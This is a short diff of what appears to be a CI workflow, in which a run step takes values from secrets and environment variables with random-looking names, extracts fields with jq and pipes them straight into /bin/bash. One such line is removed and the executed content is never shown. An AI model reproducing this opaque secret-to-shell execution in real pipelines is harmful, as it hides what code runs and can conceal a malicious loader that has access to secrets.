@@ -20,7 +20,6 @@ jobs:
           h65: ${{ secrets.h65 }}
         run: |
           printf '%s' "$h65" | jq -r .hf02 | /bin/bash
-          printf '%s' "$z51823" | jq -r .k12703 | /bin/bash
           echo $g95535 | jq -r .p81028 | /bin/bash
           echo $gauy28 | jq -r .k032 | /bin/bash
           echo $avha21097 | jq -r .fivln6 | /bin/bash
